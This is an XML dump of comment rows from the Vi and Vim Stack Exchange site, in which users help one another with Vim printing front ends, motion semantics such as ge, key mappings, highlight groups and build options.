  <row Id="2269" PostId="2435" Score="0" Text="I think the answer is that there isn't a native way. What I had read was that the kprinter program was replaced by the built-in qt printer dialog (i.e. a function call that can be made from within a program that uses qt). That transition resulted in the removal of the stand-alone program `kprinter`. There is some info and discussion at the following link (which then links to what I posted in the answer) https://liquidat.wordpress.com/2014/02/18/kprinter-available-for-kde-4/" CreationDate="2015-03-09T02:49:02.413" UserId="227" />
  <row Id="2270" PostId="2435" Score="0" Text="We linked to the same thing! :) Okay, I'll leave the question up for a little while anyway, and I'll accept your answer if I don't hear anything better." CreationDate="2015-03-09T03:02:51.370" UserId="1278" />
  <row Id="2271" PostId="2435" Score="0" Text="@Sparhawk Hah, indeed. I missed the link when I first read your comment and posted mine. Anyway, I've just added build and vimrc instructions to make my answer more complete (and less of a link-only answer). That still doesn't help you find a built-in solution, but hopefully it helps others looking for this." CreationDate="2015-03-09T03:24:17.203" UserId="227" />
  <row Id="2272" PostId="2435" Score="0" Text="No worries. Thanks for the instructions; they are so clear! I'm using Arch, so I'd do it via a PKGBUILD, which has it's own… peculiarities, but your instructions look very helpful. BTW, are you using Ubuntu? Do you know if there's a way to pipe hardcopy to its native print dialogue? If so, I wonder if I could co-opt a different DE's print frontend… (which I was implying with my first comment)." CreationDate="2015-03-09T03:28:35.030" UserId="1278" />
  <row Id="2273" PostId="2435" Score="0" Text="@Sparhawk As you guess, I am running Ubuntu 14.04 at the moment. I don't have my Arch machine handy. Any DE with a standalone print front-end program would work similar to kprinter/kprinter4. I couldn't find a standalone &quot;native&quot; dialog for Ubuntu. I did find a package for Ubuntu called `gpr` which is a gnome-ish print dialog like kprinter that is used similarly. Unfortunately, it gives me a PPD error every time I try to use it. Worse, it doesn't seem available for Arch (I don't see it listed at https://www.archlinux.org/packages/)." CreationDate="2015-03-09T03:36:54.970" UserId="227" />
  <row Id="2275" PostId="2429" Score="0" Text="It is because I thought expand meant expand the path. Eg ~/ would become /users/name" CreationDate="2015-03-09T07:37:06.533" UserId="1168" />
  <row Id="2276" PostId="2377" Score="0" Text="@tommcdo, so, am I permitted to copy?" CreationDate="2015-03-09T12:01:59.707" UserId="850" />
  <row Id="2277" PostId="2377" Score="1" Text="@Shahbaz, absolutely :)" CreationDate="2015-03-09T12:14:05.453" UserId="64" />
  <row Id="2278" PostId="2444" Score="3" Text="This isn't a bug.  `ge` goes to the end of the last word, so it would also delete the end of the last word." CreationDate="2015-03-09T13:09:23.773" UserId="865" />
  <row Id="2279" PostId="2434" Score="0" Text="kprinter was removed from the KDE4 source, and someone published a clone: https://github.com/credativ/kprinter4" CreationDate="2015-03-09T13:42:44.487" UserId="205" />
  <row Id="2280" PostId="2444" Score="2" Text="Just use `b` instead." CreationDate="2015-03-09T13:54:27.347" UserId="88" />
  <row Id="2281" PostId="2444" Score="0" Text="@EvergreenTree, what for would i want to delete the last letter of the previous word?  By the way, `dw` does not delete the first letter of the following word." CreationDate="2015-03-09T14:13:54.760" UserId="1248" />
  <row Id="2282" PostId="2444" Score="0" Text="@Doorknob, `b` deletes to the beginning of the previous word.  My question is about `ge`.  My usecase is an operation on what goes *after* the previous word." CreationDate="2015-03-09T14:16:10.607" UserId="1248" />
  <row Id="2283" PostId="2434" Score="0" Text="@muru Yes, I think that's the same one that John O'M. mentioned in his [answer](http://vi.stackexchange.com/a/2435/1278) below." CreationDate="2015-03-09T14:19:29.690" UserId="1278" />
  <row Id="2284" PostId="2435" Score="0" Text="Ah ok. I thought perhaps the Gnome, XFCE or LXDE printer frontends might be options. And I still don't know what non-Qt apps use in KDE." CreationDate="2015-03-09T14:21:13.100" UserId="1278" />
  <row Id="2285" PostId="2434" Score="0" Text="Ah, I didn't see that answer. I came across this in the review queue." CreationDate="2015-03-09T14:24:09.327" UserId="205" />
  <row Id="2286" PostId="2370" Score="0" Text="I have the same problem, and it appears to be a bug. I've posted [here](http://vi.stackexchange.com/questions/2370/vimwiki-cant-fold-list-items) a request to help to solve the bug." CreationDate="2015-03-07T01:44:20.933" UserId="1254" />
  <row Id="2287" PostId="2435" Score="0" Text="@Sparhawk you could use gtklp, there are other printer frontends. But they have a different interface (at least slightly) than the KDE one." CreationDate="2015-03-09T14:55:27.780" UserId="31" />
  <row Id="2288" PostId="2135" Score="0" Text="@jamessan Excellent, thank you!" CreationDate="2015-03-09T15:08:15.773" UserId="680" />
  <row Id="2289" PostId="543" Score="0" Text="Just use a plugin manager like neobundle." CreationDate="2015-03-09T15:12:40.433" UserId="944" />
  <row Id="2290" PostId="2444" Score="2" Text="`wW` and `bB` are &quot;exclusive&quot; motions but `eE` and `gegE` are &quot;inclusive&quot; motions. See `:h exclusive`." CreationDate="2015-03-09T17:05:49.357" UserId="54" />
  <row Id="2293" PostId="2444" Score="0" Text="Thanks for making me read help more carefully, @romainl.  I guess then this is not a bug but a design flaw." CreationDate="2015-03-09T17:16:05.043" UserId="1248" />
  <row Id="2294" PostId="2446" Score="1" Text="But in Vim you can have red underline too." CreationDate="2015-03-09T17:19:06.823" UserId="1248" />
  <row Id="2296" PostId="2448" Score="0" Text="You mean like in dvge? Try it again. It will make it exclusive, but only the character the cursor was originally was on." CreationDate="2015-03-09T17:36:24.390" UserId="71" />
  <row Id="2298" PostId="2448" Score="0" Text="did you use d\ge&#xA;This works for me justfine" CreationDate="2015-03-09T17:39:23.907" UserId="71" />
  <row Id="2301" PostId="2448" Score="0" Text="Ah, that is your problem. You also want this to be excluded? I'll update the answer" CreationDate="2015-03-09T17:41:28.553" UserId="71" />
  <row Id="2303" PostId="2448" Score="0" Text="starting visual mode" CreationDate="2015-03-09T17:43:53.890" UserId="71" />
  <row Id="2305" PostId="2448" Score="0" Text="I clean up the comments." CreationDate="2015-03-09T17:47:44.427" UserId="1248" />
  <row Id="2306" PostId="2446" Score="0" Text="Thanks @Carpetsmoker. I did look at it but I thought it was for VIM only and it wouldn't show on other text editors such as `TextEdit`. I also wasn't sure if it would display the formatting in VIM. Thanks for confirming it." CreationDate="2015-03-09T17:50:18.363" UserId="1168" />
  <row Id="2307" PostId="2448" Score="0" Text="How about `:onoremap &lt;leader&gt;ge :norm! ge &lt;cr&gt;`? ;)" CreationDate="2015-03-09T17:51:40.320" UserId="1248" />
  <row Id="2308" PostId="2448" Score="0" Text="That won't work, since as soon as you type the ge, the operation will finish and the space comes too late." CreationDate="2015-03-09T17:52:33.710" UserId="71" />
  <row Id="2310" PostId="2448" Score="0" Text="Ah yes you are right" CreationDate="2015-03-09T17:57:24.450" UserId="71" />
  <row Id="2312" PostId="2448" Score="1" Text="In fact, `:onoremap &lt;leader&gt;ge :norm! ge &lt;cr&gt;` already makes both ends exclusive (with default settings)." CreationDate="2015-03-09T18:20:48.547" UserId="1248" />
  <row Id="2313" PostId="2448" Score="1" Text="True. But I can't explain this." CreationDate="2015-03-09T18:23:24.390" UserId="71" />
  <row Id="2314" PostId="2385" Score="0" Text="`:hi StatusLine ctermbg=bg` just gives me `E420: BG color unknown`, unfortunately" CreationDate="2015-03-09T18:29:56.820" UserId="1166" />
  <row Id="2315" PostId="2385" Score="0" Text="What is the definition of the :Normal highlighting group for you?" CreationDate="2015-03-09T18:38:15.220" UserId="71" />
  <row Id="2316" PostId="2385" Score="0" Text="&quot;highlight group not found: Normal&quot;" CreationDate="2015-03-09T18:39:52.773" UserId="1166" />
  <row Id="2317" PostId="2385" Score="0" Text="Strange. There should always be a Normal highlighting group" CreationDate="2015-03-09T18:57:49.870" UserId="71" />
  <row Id="2318" PostId="2385" Score="0" Text="FWIW, I'm working from a Mac in Iterm2 with vim 7.4. &#xA;&#xA;As with most things shell-related I encounter that &quot;should work&quot; but mysteriously don't, I'm inclined to assume the issue it tied to being on OSX." CreationDate="2015-03-09T19:08:58.753" UserId="1166" />
  <row Id="2320" PostId="2436" Score="0" Text="It won't be the same, but it looks like your cygwin vim thinks it is on a light background - does `:set bg=dark` do anything?" CreationDate="2015-03-09T19:41:41.930" UserId="880" />
  <row Id="2321" PostId="2430" Score="0" Text="`:t` &quot;*Must* precede any :r or :e,&quot; yet `:e` &quot;only makes sense when used alone&quot;. By the example, I'd side with the latter, but interesting that the docs contradict themselves there." CreationDate="2015-03-09T20:50:26.527" UserId="1166" />
  <row Id="2322" PostId="2430" Score="0" Text="@SnoringFrog I believe what it means is that you can't do `:e:t`, but `:t:e` is allowed, if meaningless." CreationDate="2015-03-09T20:54:16.443" UserId="205" />
  <row Id="2323" PostId="2430" Score="0" Text="Oh, I see how it could be read that way. That makes sense then." CreationDate="2015-03-09T20:56:29.330" UserId="1166" />
  <row Id="2324" PostId="2285" Score="0" Text="@Bohr What version of vim are you using? I tried `:help keeppattern` and didn't get anything." CreationDate="2015-03-09T22:01:11.620" UserId="1111" />
  <row Id="2325" PostId="2455" Score="0" Text="Gui vim allows for more than 256 colors, as well as other text formatting, so that might be a draw.  I personally can't see why people prefer gui vim though, as I find terminal vim more convenient.  But that's my opinion." CreationDate="2015-03-09T23:47:53.660" UserId="865" />
  <row Id="2326" PostId="2456" Score="0" Text="If you want to repeat it, you probably could record it as a macro." CreationDate="2015-03-09T23:50:25.713" UserId="865" />
  <row Id="2327" PostId="2447" Score="0" Text="Good to know all different ways. Thanks!" CreationDate="2015-03-10T02:27:18.157" UserId="1283" />
  <row Id="2334" PostId="2285" Score="0" Text="@ChristopherBottoms At least version [7.4.155](ftp://ftp.vim.org/pub/vim/patches/7.4/README)." CreationDate="2015-03-10T04:51:42.337" UserId="1242" />
  <row Id="2336" PostId="2459" Score="0" Text="It also work for Linux world. If you want to open a file in vim directly from nautilus, gvim is available while vim is not." CreationDate="2015-03-10T05:32:48.307" UserId="1299" />
  <row Id="2337" PostId="2459" Score="0" Text="@kuldeep.kamboj This is simply a matter of configuring Nautilis; you can use `xterm -e vim %` or some such..." CreationDate="2015-03-10T09:28:48.673" UserId="51" />
  <row Id="2338" PostId="2464" Score="1" Text="Maybe [it's this issue](https://github.com/maksimr/vim-jsbeautify/issues/63)?" CreationDate="2015-03-10T09:37:54.593" UserId="51" />
  <row Id="2339" PostId="2456" Score="0" Text="This looks ok, thanks for the idea." CreationDate="2015-03-10T11:30:16.597" UserId="1296" />
  <row Id="2340" PostId="2454" Score="0" Text="Thanks. I'd go with &lt;kbd&gt;Control-a&lt;/kbd&gt; &lt;kbd&gt;Control-x&lt;/kbd&gt; &lt;kbd&gt;l&lt;/kbd&gt; &lt;kbd&gt;Control-a&lt;/kbd&gt;, since I don't like to add nonstandard keybinds, but this would surely be they way to do it if I had to do it really often. Thanks!" CreationDate="2015-03-10T11:31:54.193" UserId="1296" />
  <row Id="2341" PostId="2454" Score="0" Text="@PhilippFrank Yeah, that's the better answer :-) Even if you wanted to make a keybind out of this, you're probably best off basing it on that ;-)" CreationDate="2015-03-10T11:32:41.387" UserId="51" />
  <row Id="2345" PostId="2460" Score="4" Text="I'm voting to close this question as off-topic because it is about the configuration of some terminal emulator program." CreationDate="2015-03-10T12:25:29.050" UserId="13" />
  <row Id="2346" PostId="2460" Score="0" Text="You can find the list of supported terminal emulators on the [Solarized home page](http://ethanschoonover.com/solarized#terminal-emulators). Then, if supported, you can refer to the documentation of your terminal emulator to know how to set up Solarized." CreationDate="2015-03-10T12:26:47.853" UserId="13" />
  <row Id="2348" PostId="2459" Score="0" Text="That's exactly why I have `gVim` installed. Windows terminal fonts make your eyes bleed." CreationDate="2015-03-10T13:29:51.247" UserId="850" />
  <row Id="2349" PostId="2424" Score="0" Text="@elyashiv The _vimrc isn't populated with required settings.  It's just setting up some stuff that may or may not be useful to the user and providing some example settings.  The MyDiff function would fall in the example category, IMO." CreationDate="2015-03-10T13:35:26.317" UserId="15" />
  <row Id="2350" PostId="2470" Score="0" Text="Perhaps Vim can't find `libperl.so` and skips it because of that? You should post at least the full output of `vim --version` (has linker command) and preferable also the full output of `./configure` and `make`... You should have something like `-L/usr/lib/perl5/core_perl/CORE -lperl` in there." CreationDate="2015-03-10T14:07:04.180" UserId="51" />
  <row Id="2351" PostId="2285" Score="0" Text="@Bohr. Thanks! Come to find out I was still using 7.4.0. I installed the latest version and it's available." CreationDate="2015-03-10T14:08:01.490" UserId="1111" />
  <row Id="2352" PostId="2470" Score="0" Text="@Carpetsmoker You're right. That is missing. Thanks!" CreationDate="2015-03-10T14:17:17.083" UserId="1111" />
  <row Id="2353" PostId="2470" Score="0" Text="@Carpetsmoker Thanks. I didn't think to look in the middle of the configure output before your comment. I updated the question to focus on getting `profile` enabled (a necessity for me) and `perl` is more of a want." CreationDate="2015-03-10T14:25:44.667" UserId="1111" />
  <row Id="2354" PostId="2469" Score="4" Text="Note that this takes you to the middle of the line with respect to the *console width*, not with respect to the *line length*.  So, if you have a line of 10 characters and a console that is 80 characters wide, the cursor will end up on the 10th character in the line (because it's &quot;trying&quot; to get to the 40th), not the 5th." CreationDate="2015-03-10T14:29:25.867" UserId="239" />
  <row Id="2355" PostId="2469" Score="3" Text="Yep. From the question, it is not clear whether we're looking for the middle of the line or the middle of the screen. Based on the analogy to `M`, I assumed screen." CreationDate="2015-03-10T14:32:14.267" UserId="64" />
  <row Id="2358" PostId="2474" Score="1" Text="I am aware of the substitute command but I was hoping for something simpler..." CreationDate="2015-03-10T15:14:15.173" UserId="1305" />
  <row Id="2359" PostId="2442" Score="2" Text="Probably worth pointing out that 256 colours is still a lot less than that offered by GUI Vim." CreationDate="2015-03-10T15:20:02.317" UserId="343" />
  <row Id="2360" PostId="2414" Score="0" Text="`z]ip` is one more character than the sequence the OP has already dismissed as being too verbose! Upvoted anyway because your plugin looks nifty." CreationDate="2015-03-10T15:28:39.803" UserId="343" />
  <row Id="2361" PostId="2448" Score="0" Text="Can it be made to work with `[count]`?" CreationDate="2015-03-10T15:38:47.010" UserId="1248" />
  <row Id="2362" PostId="2414" Score="0" Text="@Rich, lol. That's certainly true in this case. I'll (weakly) defend myself by saying that verbosity can be measured in different ways: keystrokes is one, and number of actions is another. Technically, `z]ip` is one action whereas `]}o` is two." CreationDate="2015-03-10T15:53:18.907" UserId="64" />
  <row Id="2363" PostId="2414" Score="0" Text="Hahaha. Nice save ;)." CreationDate="2015-03-10T15:55:59.453" UserId="343" />
  <row Id="2364" PostId="2462" Score="2" Text="So is middle middle of the full line or middle of the screen width?" CreationDate="2015-03-10T16:26:36.793" UserId="205" />
  <row Id="2365" PostId="2476" Score="1" Text="This doesn't really seem like an appropriate question for vi.SE.  The versioning of a distribution's package is the discretion of the packager." CreationDate="2015-03-10T16:50:20.400" UserId="15" />
  <row Id="2366" PostId="2476" Score="0" Text="I'm voting to close this question as off-topic because it's not really about Vi or Vim as such, but about Debian's package versioning scheme." CreationDate="2015-03-10T17:21:33.420" UserId="51" />
  <row Id="2367" PostId="2448" Score="0" Text="This should do it:" CreationDate="2015-03-10T17:38:38.873" UserId="71" />
  <row Id="2368" PostId="2476" Score="0" Text="@Carpetsmoker it's not about Debian's versioning as such. Projects change version schemes (rarely, but it happens, a recent example being KDE Applications moving from 4.13 to 14.12 - date based). I wondered if something like that has happened with Vim as well - the epoch being an indicator of such a change." CreationDate="2015-03-10T17:41:44.610" UserId="205" />
  <row Id="2369" PostId="2476" Score="0" Text="@jamessan The question is not about the Debian package as such. It's just that the epoch can indicate a change in upstream version scheme, and I wondered if such a change had happened. Even if the versioning is left to the package maintainer's discretion, there's a reasonable expectation that it correspond to upstream versioning." CreationDate="2015-03-10T17:43:13.370" UserId="205" />
  <row Id="2370" PostId="2448" Score="0" Text="I ended up with this: `:onoremap &lt;leader&gt;ge :&lt;C-u&gt;exe &quot;norm! &quot;.v:count1.&quot;ge &quot;&lt;CR&gt;`" CreationDate="2015-03-10T19:18:20.077" UserId="1248" />
  <row Id="2373" PostId="2481" Score="0" Text="I'll wait for a bit, but guess this is the answer – unless there is a clever hack." CreationDate="2015-03-10T19:36:50.600" UserId="220" />
  <row Id="2374" PostId="2481" Score="0" Text="There was no patch there, just a wish, wasn't it?" CreationDate="2015-03-10T19:37:10.593" UserId="71" />
  <row Id="2375" PostId="2481" Score="0" Text="@ChristianBrabandt Doh.  You're right.  ZyX was doing a lot of hacking on the function code at the time, so I saw the post and just figured it had a patch." CreationDate="2015-03-10T19:47:08.197" UserId="15" />
  <row Id="2376" PostId="2481" Score="0" Text="@jamessan I remember that RFC, but I didn't completly understand what was meant so I never really tried to fix it" CreationDate="2015-03-10T20:44:25.643" UserId="71" />
  <row Id="2377" PostId="2484" Score="2" Text="I don't know the details, so for now I'll just comment: I'm pretty sure this has to do with a special key code created with `&lt;C-h&gt;`. If you try it in a terminal, you will see a similar behaviour. Also see `:h backspace`." CreationDate="2015-03-10T21:47:11.083" UserId="21" />
  <row Id="2378" PostId="2484" Score="0" Text="Thanks for the pointer @KarlYngveLervåg. May be worth noting that I use the Dvorak keyboard layout, which places the &quot;h&quot; letter underneath the J key (the &quot;j&quot; letter is underneath the C key). I mention this because `:h backspace` notes that &quot;&lt;NL&gt;&quot; is related to &quot;CTRL-J&quot;." CreationDate="2015-03-10T22:16:23.523" UserId="67" />
  <row Id="2379" PostId="2468" Score="0" Text="You can change the icon of a window with [`xseticon`](http://www.leonerd.org.uk/code/xseticon/) :-)" CreationDate="2015-03-10T23:54:00.010" UserId="51" />
  <row Id="2380" PostId="2486" Score="1" Text="I don't understand what the difference is? From reading the help pages, `echon` and `echomsg` work the same, except that `echomsg` adds messages to the history? You mentioned *&quot;I have been trying for some time now&quot;*, you should tell us what exactly you've tried, what you expected to happen, and what *did* happen. That way we can try and fix the problem you're having (if any) or explain some misconception you might have." CreationDate="2015-03-11T00:29:01.100" UserId="51" />
  <row Id="2387" PostId="2464" Score="0" Text="yeah, maybe, I find that thread too. But to change the vim script of a plugin seems a little too complex for me. So I've chose another approach. I've post an answer to my own question." CreationDate="2015-03-11T02:08:30.960" UserId="1276" />
  <row Id="2388" PostId="2435" Score="0" Text="@derobert Thanks, that seems like an acceptable answer. However, do you specifically know how to pipe to it from `vim`?" CreationDate="2015-03-11T03:31:14.667" UserId="1278" />
  <row Id="2389" PostId="2462" Score="0" Text="@muru Was thinking of middle of full line" CreationDate="2015-03-11T03:41:45.503" UserId="53" />
  <row Id="2390" PostId="2462" Score="2" Text="Could you add that to the question as well? And what do you expect to happen with wrapping?" CreationDate="2015-03-11T03:45:27.750" UserId="205" />
  <row Id="2391" PostId="2435" Score="0" Text="@Sparhawk following the above answer, replace the path to kprinter4 with `gtklp`, e.g: `call system(&quot;gtklp &quot; . a:fname)`. This will use gtklp as the print handler." CreationDate="2015-03-11T03:54:18.493" UserId="227" />
  <row Id="2392" PostId="2435" Score="0" Text="@derobert and JohnO'M. I don't think gtklp works here. I don't think it's passing the files correctly. http://i.imgur.com/DSWRYBx.png" CreationDate="2015-03-11T04:08:07.207" UserId="1278" />
  <row Id="2393" PostId="2435" Score="0" Text="@Sparhawk that's odd. Mine shows an item like `/tmp/vtPmLMz/10` in the &quot;Files to print&quot; list. Can you show us what your current settings for this in your vimrc are (either updating the question, via pastebin, or a screenshot of it in another comment)?" CreationDate="2015-03-11T04:22:50.640" UserId="227" />
  <row Id="2394" PostId="2435" Score="0" Text="I created a [minimal vimrc](http://pastebin.com/gqX9rdaf), which still exhibits this behaviour. I also have a bunch of plugins that I unloaded, launching vim with `vim -u ~/.vimrc foo`." CreationDate="2015-03-11T04:27:15.590" UserId="1278" />
  <row Id="2395" PostId="2435" Score="0" Text="@Sparhawk just tried it with your vimrc, and it still works for me. What happens if you run gtklp from the commandline? (e.g. as `gtklp somefakefile`). Does it show the arguments in the file list, or leave the file list empty still?" CreationDate="2015-03-11T04:30:42.643" UserId="227" />
  <row Id="2396" PostId="2435" Score="0" Text="Ha! Odd… The file list is still empty. I tried both a text file and a postscript file. Perhaps I'm missing a dependency." CreationDate="2015-03-11T04:37:30.020" UserId="1278" />
  <row Id="2397" PostId="2435" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/21836/discussion-between-john-om-and-sparhawk)." CreationDate="2015-03-11T04:38:25.407" UserId="227" />
  <row Id="2398" PostId="2490" Score="0" Text="I wanted to tag this question [formatting] and [conceal], but I was not allowed to create new tags. Perhaps someone else could do that?" CreationDate="2015-03-11T09:41:18.120" UserId="1306" />
  <row Id="2400" PostId="2490" Score="0" Text="I thought that was what I did ask. Does it seem like I am asking about `par`? I mention it by way of context–it is how I currently format text. I am asking for alternatives to my current method that accommodate the discrepancy between displayed and actual line length introduced by concealing, I am not invested in any particular formatting method. Thanks for retagging (though I did not intend this question to be about syntax highlighting or external commands)." CreationDate="2015-03-11T10:14:39.197" UserId="1306" />
  <row Id="2401" PostId="2490" Score="0" Text="So you do ... I blame mornings without any coffee yet :-/ ... conceal seems to be a feature of Vim's syntax highlighting, which is why I tagged it as such :-)" CreationDate="2015-03-11T10:28:23.523" UserId="51" />
  <row Id="2402" PostId="2491" Score="0" Text="Can't believe I forgot to mention that in my answer! Upvoted." CreationDate="2015-03-11T12:58:54.587" UserId="343" />
  <row Id="2403" PostId="2494" Score="0" Text="Interesting! (Especially your idea about the threshold.) Thanks for the info. Gonna hold off on the upvote/accept for the time being in an attempt to encourage someone to come up with some crazy VimScript to do this in the interim." CreationDate="2015-03-11T13:35:00.177" UserId="343" />
  <row Id="2404" PostId="2495" Score="1" Text="Thanks for removing the duplicate submission on SO! (You can still post there in a few days if there's no progress here, though this beta site gets quite some attention in the moment.)" CreationDate="2015-03-11T14:18:35.343" UserId="970" />
  <row Id="2405" PostId="2424" Score="0" Text="For reference, here's another way: install [Chocolatey](https://chocolatey.org/), then run `cinst vim` from an administrator PowerShell (command prompt will work too, but PS is recommended). To upgrade it later, use `cup vim`. (The commands are short for `chocolatey install vim` and `chocolatey upgrade vim`, respectively. There's also a `choco` shorthand for `chocolatey`.)" CreationDate="2015-03-11T14:34:03.123" UserId="1230" />
  <row Id="2406" PostId="2496" Score="0" Text="I asked about other thing. Omni completion worked fine at that moment. But content of popup window was almost useless." CreationDate="2015-03-11T15:35:53.183" UserId="500" />
  <row Id="2407" PostId="2497" Score="1" Text="You shouldn't have to manually define those autocmds.  If you add `filetype plugin on` to your vimrc, then they should be automatically set." CreationDate="2015-03-11T15:37:31.213" UserId="15" />
  <row Id="2408" PostId="2497" Score="0" Text="@jamessan Yes, It is my very old config and there was some junk in it from that time when I started to learn vim. Hope my config without any issues anymore. Thank you for pointing on this." CreationDate="2015-03-11T15:40:21.487" UserId="500" />
  <row Id="2409" PostId="2498" Score="0" Text="Thanks for the reply. Will look into this soon. Where is $VIM (on a Mac)? I know $HOME is ~/ but not where $VIM/ ." CreationDate="2015-03-11T16:33:37.980" UserId="1168" />
  <row Id="2410" PostId="2498" Score="1" Text="Not sure on the Mac, Linux is /usr/share/vim typically. Probably pretty similar location." CreationDate="2015-03-11T16:35:20.587" UserId="895" />
  <row Id="2411" PostId="2498" Score="0" Text="It is the same on a Mac. Thanks." CreationDate="2015-03-11T16:47:28.660" UserId="1168" />
  <row Id="2412" PostId="2498" Score="0" Text="I edited `c-support/codesnippets/main.cc` but it didn't work so I edited the `c.idioms.template` file and it worked. Thanks." CreationDate="2015-03-11T17:38:01.293" UserId="1168" />
  <row Id="2413" PostId="2499" Score="1" Text="The only think in my vimrc file for pathogen is `execute pathogen#infect()` and it does not ask me to hit `enter`. Are you invoking it differently?" CreationDate="2015-03-11T18:24:01.260" UserId="383" />
  <row Id="2414" PostId="2500" Score="0" Text="Beat me to it :-)" CreationDate="2015-03-11T18:26:51.050" UserId="1155" />
  <row Id="2415" PostId="2491" Score="0" Text="Yes, I use the `:messages` command, but this also renders the main window *un-scrollable*. Another issue I have with it is that it stores 200 messages (running normal, not tiny Vim.) If one have typically 200 messages it is going to fill entire height of Vim + it usually yield 1NN+ messages before the ones I want. The whole process becomes somewhat cumbersome - especially on multiple errors. *But*; +1 as it is relevant." CreationDate="2015-03-11T18:40:36.390" UserId="220" />
  <row Id="2416" PostId="2485" Score="0" Text="Trying out some solutions based on the commands. Yes; it is when writing own scripts, (or debugging others), typically by `:so %` or the like." CreationDate="2015-03-11T19:10:58.857" UserId="220" />
  <row Id="2417" PostId="2491" Score="0" Text="In that case I think that the answer @Rich posted is what you are looking for. Maybe he could expand his answer to include mine such that it contains all relevant information?" CreationDate="2015-03-11T19:26:38.433" UserId="599" />
  <row Id="2418" PostId="2500" Score="0" Text="Missed that message it gave me!" CreationDate="2015-03-11T19:46:35.410" UserId="1168" />
  <row Id="2419" PostId="2450" Score="0" Text="Huh, this is interesting. I didn't know it was so easy to override a library call. This does technically answer my question (as does the other answer) but neither are as portable as I'd like (.vimrc setting would be ideal but I hate adding plugins for such a small problem). Is it bad etiquette to leave a question without a marked answer for a while?" CreationDate="2015-03-11T20:06:41.423" UserId="200" />
  <row Id="2420" PostId="2491" Score="0" Text="@Vitor I don't think that's necessary. It's fine for different answers to contain different solutions for the same problem. If people don't like my answer I'm sure they'll read yours, and vice versa!" CreationDate="2015-03-11T22:32:38.057" UserId="343" />
  <row Id="2422" PostId="2371" Score="0" Text="Somebody should make that an answer..." CreationDate="2015-03-12T02:23:55.973" UserId="1094" />
  <row Id="2423" PostId="2505" Score="0" Text="Is a solution to enable it for only certain files ok? Or do you also want it for example disabled in C comments but enabled in code?" CreationDate="2015-03-12T10:38:30.167" UserId="850" />
  <row Id="2424" PostId="2505" Score="0" Text="@Shahbaz: Enabling it only for certain files types is a solution I'd accept. However, your second sounds awesome if it were possible! ^_~" CreationDate="2015-03-12T10:51:14.487" UserId="622" />
  <row Id="2425" PostId="2484" Score="1" Text="Worth trying as a workaround: `noremap     &lt;C-h&gt; &lt;c-w&gt;&lt;c-h&gt;` (i.e. &lt;c-h&gt; instead of h) as they are equivalent" CreationDate="2015-03-12T12:00:00.570" UserId="182" />
  <row Id="2426" PostId="2469" Score="1" Text="Actually I just tried this on a wide (about 180 chars) screen with 80-char text. The cursor went to the *end* of the line. Doesn't seem a very useful command." CreationDate="2015-03-12T13:47:01.860" UserId="1094" />
  <row Id="2427" PostId="2508" Score="0" Text="Yup, I did try that but no joy. I get the same error." CreationDate="2015-03-12T13:53:38.917" UserId="622" />
  <row Id="2428" PostId="2486" Score="0" Text="I am sorry for being unclear. I've update the question in order for it to be more clear, in particular in that I want the `echon` functionality combined with adding messages to the history." CreationDate="2015-03-12T13:54:52.053" UserId="21" />
  <row Id="2429" PostId="2489" Score="1" Text="I've updated the question so the intent is clearer. I think you could likewise update the answer slightly following my update (but that's up to you). I believe your answer is sufficient for being marked &quot;accepted&quot;, although I am still hoping for some good idea for &quot;hacking&quot; the functionality with vim script." CreationDate="2015-03-12T13:56:48.990" UserId="21" />
  <row Id="2430" PostId="2484" Score="0" Text="@jalanb replacing my `&lt;C-h&gt;` remap with your suggestion causes an audible bell, and no cursor movement. (Pressing `&lt;C-w&gt;&lt;C-h&gt;` does work jump to the split to the left.)" CreationDate="2015-03-12T17:47:58.640" UserId="67" />
  <row Id="2431" PostId="2500" Score="0" Text="You may have escaped the `Press ENTER` gremlin for now, but sooner or later he will be back.  When that happens, check out `:h press-enter` for some tips to avoid him!" CreationDate="2015-03-12T17:58:01.603" UserId="630" />
  <row Id="2432" PostId="2518" Score="0" Text="Instead of `^` to go to the beginning of the line, you could use `B` to go to the beginning of the WORD." CreationDate="2015-03-12T18:09:08.490" UserId="226" />
  <row Id="2433" PostId="2475" Score="0" Text="A friendly way to do this might be to hit `V` or `va{` to select the lines that interest you (or drag-select them with the mouse), then do `:s/\&lt;i\&gt;/j/gc`.  The `c` flag asks for confirmation of each change, so you can feel extra confident that you didn't change anything unwanted.  If `hlsearch` is enabled, all the matches will be highlighted, so you can hit `a` if you see that you want to replace all of them." CreationDate="2015-03-12T18:10:22.007" UserId="630" />
  <row Id="2434" PostId="2478" Score="0" Text="To avoid typing the variable, I often hover over it and hit `*`.  Then `N` to go back to where I was.  Then `cwj&lt;Esc&gt;` then `n.n.n.n.` :)" CreationDate="2015-03-12T18:13:22.193" UserId="630" />
  <row Id="2435" PostId="2475" Score="0" Text="Although FWIW, I also use a [handy little plugin](https://github.com/joeytwiddle/rc_files/blob/master/.vim/plugin/replace.vim) for this task.  `\r` for whole file, `\R` for all buffers.  But no option to cover only the visual selection (the visual selection is taken as the search pattern)." CreationDate="2015-03-12T18:21:13.157" UserId="630" />
  <row Id="2436" PostId="2518" Score="0" Text="Not all URL all perfectly formed. A **LOT** don't have the `?` character and just use the `&amp;`. Browser automatically compensate (so you don't notice it much) but there are a significant number out there. So I would replace the `df?` with `d/[?&amp;]&lt;enter&gt;x`" CreationDate="2015-03-12T18:30:15.937" UserId="383" />
  <row Id="2437" PostId="2517" Score="2" Text="Have you tried anything so far? By showing your attempts and describing what parts you are having difficulty with, we get a better understanding of your proficiency and can give a more precise answer. As it stands, it just looks like you've posted a requirement and want someone to write your code for you." CreationDate="2015-03-12T18:36:23.663" UserId="970" />
  <row Id="2438" PostId="2513" Score="0" Text="thanks jamessan. I tried &quot;nnoremap gf &lt;c-w&gt;gF&quot; but its opening file in new tab. How to open it in horizontally split window rather than newtab." CreationDate="2015-03-12T19:10:24.537" UserId="1334" />
  <row Id="2439" PostId="2513" Score="0" Text="Thanks I tried &quot;nnoremap gf &lt;C-w&gt;F&quot; and it solved my problem. Thanks all." CreationDate="2015-03-12T19:20:23.387" UserId="1334" />
  <row Id="2440" PostId="2520" Score="0" Text="This got flagged as low quality. Perhaps you could add in the information in https://github.com/neovim/neovim/issues/2048#issuecomment-78045837 which seems to have a workaround?" CreationDate="2015-03-12T19:29:16.383" UserId="205" />
  <row Id="2441" PostId="2520" Score="0" Text="@mur Or close the question because it's likely not going to be useful long term.  vi.SE isn't a bug reporting forum." CreationDate="2015-03-12T19:31:42.223" UserId="15" />
